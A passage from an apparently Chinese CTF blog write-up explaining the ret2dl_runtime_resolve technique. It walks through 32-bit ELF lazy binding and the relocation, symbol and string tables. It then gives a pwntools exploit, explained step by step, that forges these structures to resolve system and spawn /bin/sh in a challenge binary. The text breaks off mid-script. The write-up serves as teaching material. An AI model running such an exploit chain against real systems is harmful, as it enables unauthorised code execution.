&lt;0xf7fe3ac0&gt;</span><br></pre></td></tr></table></figure><p>这是我在read@plt处下断，</p><ul><li>你看他第一次调用的时候，<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>里存的是下一条指令的地址，也就是0x8048396，</li><li>然后将read函数在表里的偏移push进去，这里push的是0，</li><li>然后跳到plt0里，将linkmap push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>表里，然后将程序的控制权交给解析出来的地址指向的函数</li></ul><p><strong>而我们的攻击方式就是伪造所谓的表，然后将我们伪造表的偏移当参数传入，这样的话，他就会解析到我们想需要的函数了</strong><br>这只是通俗易懂的说法，实际伪造这个表起来不是那么简单，除非你理解了整个过程<br>我将ctf-wiki上的内容摘抄过来了，帮助你们理解，他是进行了完整的解释，我感觉太长了，不过我理解过后看的话，看懂了。。。</p><h2 id="elf部分的关键点（来自ctf-wiki"><a href="#elf部分的关键点（来自ctf-wiki" class="headerlink" title="elf部分的关键点（来自ctf-wiki)"></a>elf部分的关键点（来自ctf-wiki)</h2><p>动态链接器和程序按照如下方式解析过程链接表和全局偏移表的符号引用。</p><ol><li>当第一次建立程序的内存镜像时，动态链接器将全局偏移表的第二个和第三个项设置为特殊的值，下面的步骤会仔细解释这些数值。</li><li>如果过程链接表是位置独立的话，那么 GOT 表的地址必须在 ebx 寄存器中。每一个进程镜像中的共享目标文件都有独立的 PLT 表，并且程序只在同一个目标文件将控制流交给 PLT 表项。因此，调用函数负责在调用 PLT 表项之前，将全局偏移表的基地址设置为寄存器中。</li><li>这里举个例子，假设程序调用了 name1，它将控制权交给了 lable .PLT1。</li><li>那么，第一条指令将会跳转到全局偏移表中 name1 的地址。初始时，全局偏移表中包含 PLT 中下一条 pushl 指令的地址，并不是 name1 的实际地址。</li><li>因此，程序将一个重定向偏移（reloc_index）压到栈上。重定位偏移是 32 位的，并且是非负的数值。此外，重定位表项的类型为 R_386_JMP_SLOT，并且它将会说明在之前 jmp 指令中使用的全局偏移表项在 GOT 表中的偏移。重定位表项也包含了一个符号表索引，因此告诉动态链接器什么符号目前正在被引用。在这个例子中，就是 name1 了。</li><li>在压入重定位偏移后，程序会跳转到 .PLT0，这是过程链接表的第一个表项。pushl 指令将 GOT 表的第二个表项 (got_plus_4 或者 4(%ebx)，当前 ELF 对象的信息) 压到栈上，然后给动态链接器一个识别信息。此后，程序会跳转到第三个全局偏移表项 (got_plus_8 或者 8(%ebx)，指向动态装载器中_dl_runtime_resolve 函数的指针) 处，这将会将程序流交给动态链接器。</li><li>当动态链接器接收到控制权后，他将会进行出栈操作，查看重定位表项，找到对应的符号的值，将 name1 的地址存储在全局偏移表项中，然后将控制权交给目的地址。</li><li>过程链接表执行之后，程序的控制权将会直接交给 name1 函数，而且此后再也不会调用动态链接器来解析这个函数。也就是说，在 .PLT1 处的 jmp 指令将会直接跳转到 name1 处，而不是再次执行 pushl 指令。</li></ol><p>在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用</p><p>_dl_runtime_resolve(link_map_obj, reloc_index)</p><p>这里以 32 位为例（64 位类似），具体的过程如下</p><ul><li>根据 reloc_index 计算相应的重定位表项：Elf32_Rel *reloc = JMPREL + index</li><li>根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)&gt;&gt;8</li><li>继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)&gt;&gt;8)]</li><li>判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )</li><li>if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)<ul><li>if (sym-&gt;st_other) &amp; 3 == 0 )</li><li>判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。</li></ul></li><li>得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。</li><li><ul><li>uint16_t ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8]</li></ul></li><li><ul><li>r_found_version *version = &amp;l-&gt;l_version[ndx]</li></ul></li><li>根据 name 来寻找相应函数在库中的地址。<ul><li>name = STRTAB + sym-&gt;st_name</li></ul></li></ul><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>刚刚我说了攻击方式，接下来我们就要伪造偏移跟表了<br>简单来说，ret2dllruntime这个攻击方式他要利用三个表:</p><ol><li>.rel.plt</li><li>.dynsym</li><li>.dynstr</li><li>他先从.rel.plt表里找到某个函数在dynsym里的偏移</li><li>然后从.dynsym符号表里找寻该函数在.dynstr表里的偏移</li><li>在从.dynstr表里找到具体的函数对应的字符串，然后将这个字符串解析成函数<br>所以如果我们可以找到这个表，改掉这个表里的字符串，按理说也是可以进行调用成功的<br>贴张图，这是整体结构部分图</li></ol><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190510172844-014afe92-7306-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190510172844-014afe92-7306-1.png" alt="img"></a></p><h3 id="第一个表是-rel-plt也就是ELF-REL-Relocation-Table"><a href="#第一个表是-rel-plt也就是ELF-REL-Relocation-Table" class="headerlink" title="第一个表是.rel.plt也就是ELF REL Relocation Table"></a>第一个表是.rel.plt也就是ELF REL Relocation Table</h3><p>这个表里有个结构体，存储了写入位置和具体偏移量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804831C ; ELF REL Relocation Table</span><br><span class="line">LOAD:0804831C                 Elf32_Rel &lt;8049FFCh, 306h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048324                 Elf32_Rel &lt;804A040h, 705h&gt; ; R_386_COPY stderr</span><br><span class="line">LOAD:0804832C                 Elf32_Rel &lt;804A060h, 905h&gt; ; R_386_COPY stdin</span><br><span class="line">LOAD:08048334                 Elf32_Rel &lt;804A064h, 605h&gt; ; R_386_COPY stdout</span><br><span class="line">LOAD:0804833C ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:0804833C                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:08048344                 Elf32_Rel &lt;804A010h, 207h&gt; ; R_386_JMP_SLOT alarm</span><br><span class="line">LOAD:0804834C                 Elf32_Rel &lt;804A014h, 407h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:08048354                 Elf32_Rel &lt;804A018h, 507h&gt; ; R_386_JMP_SLOT setvbuf</span><br><span class="line">LOAD:08048354 LOAD            ends</span><br></pre></td></tr></table></figure><ul><li>前面是写入的位置，而107代表的是偏移为1的导入函数，07代表的是导入函数的意思，所以你在exp里会看到&lt;&lt;8位或者&gt;&gt;8位这种操作，就是去掉07或者增加07</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">           Elf32_Addr r_offset;</span><br><span class="line">           Elf32_Word r_info;</span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><ul><li>他实际是个结构体，每个都由r_offset和r_info组成，r_info存的也是偏移，是在dynsym表里的偏移,例如read，他在这里是107h就是偏移为1的导入函数，从ELF Symbol Table里找</li></ul><h3 id="第二个表是-dynsym也就是ELF-Symbol-Table"><a href="#第二个表是-dynsym也就是ELF-Symbol-Table" class="headerlink" title="第二个表是.dynsym也就是ELF Symbol Table"></a>第二个表是.dynsym也就是ELF Symbol Table</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481DC ; ELF Symbol Table</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aRead - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aAlarm - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;alarm&quot;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aGmonStart - offset byte_804827C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:0804821C                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804827C, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0804821C                            0&gt;</span><br><span class="line">LOAD:0804822C                 Elf32_Sym &lt;offset aSetvbuf - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;setvbuf&quot;</span><br><span class="line">LOAD:0804823C                 Elf32_Sym &lt;offset aStdout - offset byte_804827C, \ ; &quot;stdout&quot;</span><br><span class="line">LOAD:0804823C                            offset stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:0804824C                 Elf32_Sym &lt;offset aStderr - offset byte_804827C, \ ; &quot;stderr&quot;</span><br><span class="line">LOAD:0804824C                            offset stderr@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:0804825C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804827C, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:0804825C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:0804826C                 Elf32_Sym &lt;offset aStdin - offset byte_804827C, \ ; &quot;stdin&quot;</span><br><span class="line">LOAD:0804826C                            offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br></pre></td></tr></table></figure><p>在这个表里查到也就是第一个函数，没毛病，其实这个表每个项也是一个结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; //对于导入函数符号而言，它是0x12</span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</span><br></pre></td></tr></table></figure><p>我们所以要伪造的还有st_name，让他去我们的.dynstr表里查找，查找到我们需要的</p><h3 id="第三个表就是-dynstr了，也就是ELF-String-Table"><a href="#第三个表就是-dynstr了，也就是ELF-String-Table" class="headerlink" title="第三个表就是.dynstr了，也就是ELF String Table"></a>第三个表就是.dynstr了，也就是ELF String Table</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804827C ; ELF String Table</span><br><span class="line">LOAD:0804827C byte_804827C    db 0                    ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:0804827C                                         ; LOAD:080481FC↑o ...</span><br><span class="line">LOAD:0804827D aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048287 aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   ; DATA XREF: LOAD:0804825C↑o</span><br><span class="line">LOAD:08048296 aStdin          db &apos;stdin&apos;,0            ; DATA XREF: LOAD:0804826C↑o</span><br><span class="line">LOAD:0804829C aRead           db &apos;read&apos;,0             ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:080482A1 aStdout         db &apos;stdout&apos;,0           ; DATA XREF: LOAD:0804823C↑o</span><br><span class="line">LOAD:080482A8 aStderr         db &apos;stderr&apos;,0           ; DATA XREF: LOAD:0804824C↑o</span><br><span class="line">LOAD:080482AF aAlarm          db &apos;alarm&apos;,0            ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:080482B5 aSetvbuf        db &apos;setvbuf&apos;,0          ; DATA XREF: LOAD:0804822C↑o</span><br><span class="line">LOAD:080482BD aLibcStartMain  db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:080482BD                                         ; DATA XREF: LOAD:0804821C↑o</span><br><span class="line">LOAD:080482CF aGmonStart      db &apos;__gmon_start__&apos;,0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:080482DE aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">LOAD:080482E8                 dd 20000h, 2, 2 dup(20002h), 20001h, 10001h, 1, 10h, 0</span><br><span class="line">LOAD:0804830C                 dd 0D696910h, 20000h, 62h, 0</span><br></pre></td></tr></table></figure><p>这个没啥好解释的就是一串字符串，找到这个后，_dl_lookup就会拿这个字符串去查找对应的函数，然后将函数地址取回来写入got.plt表，最后将程序控制权交给该函数<br><strong>注意：这里的都是相对偏移地址，没有绝对地址，切记切记，不然等会构造exp的时候你会一脸懵逼的</strong></p><h2 id="exp详解"><a href="#exp详解" class="headerlink" title="exp详解"></a>exp详解</h2><p>我将exp分段进行讲述吧，从exp里调试或许能更清晰的解释这个过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">offset = 44</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">io = process(&apos;./pwn&apos;)</span><br><span class="line">rop = ROP(&apos;./pwn&apos;)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(&apos;a&apos;*offset)</span><br><span class="line">rop.read(0, base_stage, 100)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(rop.chain())</span><br></pre></td></tr></table></figure><p>这段只是进行栈的迁移，这个部分的知识自行到ctf-wiki补充，或者找些题目练下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr</span><br></pre></td></tr></table></figure><p><strong>这是初始化取那三个表地址，plt0是我刚解释过的带linkmap然后jmp到_dl_runtime_resolve的，没有他我们无法进行解析</strong><br>我将上述代码分为两个部分，一部分为取地址初始化，第二部分才为构造，开头先取各个表的地址，至于为什么要.header.sh_addr这里是因为e这是elf的section header部分，他表里有个字段叫sh_addr</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    ELF32_Word      sh_name;</span><br><span class="line">    ELF32_Word      sh_type;</span><br><span class="line">    ELF32_Word      sh_flags;</span><br><span class="line">    ELF32_Addr      sh_addr;</span><br><span class="line">    ELF32_Off       sh_offset;</span><br><span class="line">    ELF32_Word      sh_size;</span><br><span class="line">    ELF32_Word      sh_link;</span><br><span class="line">    ELF32_Word      sh_info;</span><br><span class="line">    ELF32_Word      sh_addralign;</span><br><span class="line">    ELF32_Word      sh_entsize;</span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><table><thead><tr><th>成员</th><th>说明</th><th></th></tr></thead><tbody><tr><td>sh_name</td><td>节名称，是节区头字符串表节区中（Section Header String Table Section）的索引，因此该字段实际是一个数值。在字符串表中的具体内容是以 NULL 结尾的字符串。</td><td></td></tr><tr><td>sh_type</td><td>根据节的内容和语义进行分类，具体的类型下面会介绍。</td><td></td></tr><tr><td>sh_flags</td><td>每一比特代表不同的标志，描述节是否可写，可执行，需要分配内存等属性。</td><td></td></tr><tr><td>sh_addr</td><td>如果节区将出现在进程的内存映像中，此成员给出节区的第一个字节应该在进程镜像中的位置。否则，此字段为 0。</td><td></td></tr><tr><td>sh_offset</td><td>给出节区的第一个字节与文件开始处之间的偏移。SHT_NOBITS 类型的节区不占用文件的空间，因此其 sh_offset</td><td>成员给出的是概念性的偏移。</td></tr><tr><td>sh_size</td><td>此成员给出节区的字节大小。除非节区的类型是 SHT_NOBITS ，否则该节占用文件中的 sh_size 字节。类型为SHT_NOBITS 的节区长度可能非零，不过却不占用文件中的空间。</td><td></td></tr><tr><td>sh_link</td><td>此成员给出节区头部表索引链接，其具体的解释依赖于节区类型。</td><td></td></tr><tr><td>sh_info</td><td>此成员给出附加信息，其解释依赖于节区类型。</td><td></td></tr><tr><td>sh_addralign</td><td>某些节区的地址需要对齐。例如，如果一个节区有一个 doubleword 类型的变量，那么系统必须保证整个节区按双字对齐。也就是说，$sh_addr % sh_addralign$=0。目前它仅允许为 0，以及 2 的正整数幂数。 0 和 1 表示没有对齐约束。</td><td></td></tr><tr><td>sh_entsize</td><td>某些节区中存在具有固定大小的表项的表，如符号表。对于这类节区，该成员给出每个表项的字节大小。反之，此成员取值为0。</td><td></td></tr></tbody></table><p>sh_addr就是取这个地址，取进程镜像中的地址</p><h3 id="接下来是重点了"><a href="#接下来是重点了" class="headerlink" title="接下来是重点了"></a>接下来是重点了</h3><ul><li>如果这部分不理解，你就。。。</li><li>其实还是可以做这道题的，因为这是原理部分内容，完全可以复制黏贴一把梭，不用理解</li><li>不过做题图个啥，不就是懂这个原理嘛，接下来仔细解释下如何构造</li></ul><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fake_sym_addr = base_stage + 32</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">#对齐</span><br></pre></td></tr></table></figure><p>接下来就是真正的构造部分了，我先构造dynsym内容的地址，我将base_stage + 32作为system函数的偏移地址，也就是说，我知道了dynstr的system地址了，<strong>但我这随便取的base_stage + 32 有可能相对于dynsym不是个标准地址</strong> 什么叫标准地址，他的每个结构体都是16个字节，也就是说他的地址都是对齐的，我可能相对于他不是刚好一个对齐的地址，所以我这里需要对齐一下，利用我对齐上面部分的代码就可以进行对齐了。解释下：<br>假设内存布局是这样的</p><p>0x8048a00 11111111 22222222 33333333 44444444 dynsym起始位置<br>0x8048a10 11111111 22222222 33333333 44444444<br>0x8048a20 11111111 22222222 33333333 44444444<br>0x8048a30 11111111 22222222 33333333 44444444<br>0x8048a40 11111111 22222222 33333333 44444444<br>0x8048a50 11111111 22222222 33333333 44444444<br>0x8048a60 11111111 22222222 33333333 44444444<br>0x8048a70 11111111 22222222 33333333 44444444<br>0x8048a80 11111111 22222222 33333333 44444444</p><p>我base_stage + 32可能在这4个部分的任意位置，但这样是不行的，他的结构体只能从开头开始，所以我需要取他的这段开头的地址</p><ul><li>假设我在第3部分，第一个3的位置，那我base_stage + 32就是0x8048a88</li><li>利用上面那个计算方式就是0x10 - ((0x8048a88 - 0x8048a00) &amp; 0xf) = 0x10 - 0x8 = 0x8</li><li>故我的地址在加上align后就变成0x8048a90刚好是对齐了</li></ul><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index_dynsym = (fake_sym_addr - dynsym)/0x10</span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">read_got = elf.got[&apos;setvbuf&apos;]</span><br><span class="line">fake_sys_rel = flat([read_got, r_info])</span><br><span class="line">#构造.rel.plt表</span><br></pre></td></tr></table></figure><ul><li>然后利用这个对齐后的地址开始构造，我可以求出他在.rel.plt表中的偏移,别忘了，我当初说过的，这是相对偏移，所以我们要求r_info也是相对偏移，</li><li>先通过( fake_sym_addr - dynsym(基地址) )/0x10,求出偏移</li><li>然后再在这个地址后面添加上07标识，表示这个函数是导入函数，所以就变成了,左移8位就是增加一个字节，两位二进制位， |7相当于加7</li><li>然后我们需要一个地址进行写入，以后调用跳到这个表的函数就会直接去到函数的真实地址了，不过这里我们只需调用一次，不需要二次调用，所以地址可以随便写，当然，要可写的地址。。。我取了setvbuf的got表，然后将他做成个结构体</li><li>flat([])就是将里面的全变成字符</li></ul><h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sys = flat([st_name, 0, 0, 0x12])</span><br></pre></td></tr></table></figure><ul><li>构造dynsym表里的结构体，如果你不记得他具体结构是什么，往上翻一下，我们需要伪造的只有第一项跟第四项，其余为0，第一项为st_name，也就是符号的具体偏移位置，第四项标识为导入函数</li><li>这里我将fake_sym_addr + 0x10作为’system\x00’的地址，然后求出相对偏移，然后将他构造成一个结构体</li></ul><h4 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index_offset = base_stage + 24 - rel_plt</span><br></pre></td></tr></table></figure><p>这部分是最后的了，这个偏移就是拿来寻找.rel.plt表的<br>构造完后，我们需要构造ROP链了</p><h3 id="ROP链的构造"><a href="#ROP链的构造" class="headerlink" title="ROP链的构造"></a>ROP链的构造</h3><p>说实话，我好几次看这个ROP链，我都被绕晕了，搞了好几次才完全理解，忘了结构体的原因，建议不要跟博主一样这样命名，结构体最后加个fake_sys_struct这样的，方便看</p><h4 id="第一部分-1"><a href="#第一部分-1" class="headerlink" title="第一部分"></a>第一部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop = ROP(&apos;./pwn&apos;)</span><br><span class="line">sh = &apos;/bin/sh&apos;</span><br></pre></td></tr></table></figure><ul><li><p>初始化ROP链和参数</p><p>#### 第二部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br></pre></td></tr></table></figure></li><li><p>先plt0，我已经说过了，调用那部分地址，才能利用_dl_runtime_resolve</p></li><li><p>然后传入偏移,32位是用栈传参的，也就是这样</p></li><li><p>如果是64位，这里还得调整下，先利用pop将参数弄到寄存器里，在调用plt0</p></li></ul><h4 id="第三部分-1"><a href="#第三部分-1" class="headerlink" title="第三部分"></a>第三部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line">rop.raw(base_stage+82)</span><br></pre></td></tr></table></figure><ul><li><p>bbbb为返回地址</p></li><li><p>base-stage + 82 为函数参数，这个函数是我们最后将程序控制权交给他的函数，本题里也就是system函数</p><p>这里具体为什么是这里，你可以从gdb调试看出来，他里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble _dl_runtime_resolve</span><br><span class="line">Dump of assembler code for function _dl_runtime_resolve:</span><br><span class="line">=&gt; 0xf7f7e6c0 &lt;+0&gt;: push   eax</span><br><span class="line"> 0xf7f7e6c1 &lt;+1&gt;: push   ecx</span><br><span class="line"> 0xf7f7e6c2 &lt;+2&gt;: push   edx</span><br><span class="line"> 0xf7f7e6c3 &lt;+3&gt;: mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line"> 0xf7f7e6c7 &lt;+7&gt;: mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line"> 0xf7f7e6cb &lt;+11&gt;:    call   0xf7f78ac0 &lt;_dl_fixup&gt;</span><br><span class="line"> 0xf7f7e6d0 &lt;+16&gt;:    pop    edx</span><br><span class="line"> 0xf7f7e6d1 &lt;+17&gt;:    mov    ecx,DWORD PTR [esp]</span><br><span class="line"> 0xf7f7e6d4 &lt;+20&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line"> 0xf7f7e6d7 &lt;+23&gt;:    mov    eax,DWORD PTR [esp+0x4]</span><br><span class="line"> 0xf7f7e6db &lt;+27&gt;:    ret    0xc</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190510172916-147155ac-7306-1.png" alt="img"></p></li><li><p>从上图可以看出，他直接将栈迁移到了system函数那里，看到这里不由得佩服前人们，研究出了这些攻击方法，然后后面又提高了栈， ret 0xc平衡堆栈过后就刚好对应上了<br>看参数<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190510173006-326e45d8-7306-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190510173006-326e45d8-7306-1.png" alt="img"></a></p></li><li><p>这里arg[0]就是返回地址，</p></li><li><p>arg[1]就是参数了</p></li><li><p>符合了原来的说法，调用完dl_runtime_resolve后将程序控制权交给解析出来的函数。。我先把后面的过程讲了，我在绕回来讲表吧</p></li></ul><h4 id="第四部分-1"><a href="#第四部分-1" class="headerlink" title="第四部分"></a>第四部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line">rop.raw(&apos;bbbb&apos;)</span><br></pre></td></tr></table></figure><ul><li>进行填充，使位置达到base_stage + 24</li></ul><h4 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(fake_sys_rel)</span><br></pre></td></tr></table></figure><ul><li>填入.rel.plt里的一个结构体，用于解析函数</li></ul><h4 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(align * &apos;a&apos;)</span><br></pre></td></tr></table></figure><ul><li><p>填充对齐部分</p><p>#### 第七部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(fake_sys)</span><br></pre></td></tr></table></figure></li><li><p>这里填入的是一个结构体，大小为0x10，fake_sys-&gt;st_name后去找我们的dynstr，这里st_name构造的就是这里地址在加0x10，所以这个结构体过后就是system字符串地址了</p></li></ul><h4 id="第八部分"><a href="#第八部分" class="headerlink" title="第八部分"></a>第八部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(&apos;system\x00&apos;)</span><br></pre></td></tr></table></figure><h4 id="第九部分"><a href="#第九部分" class="headerlink" title="第九部分"></a>第九部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(&apos;a&apos;*(80 - len(rop.chain())))</span><br><span class="line">print 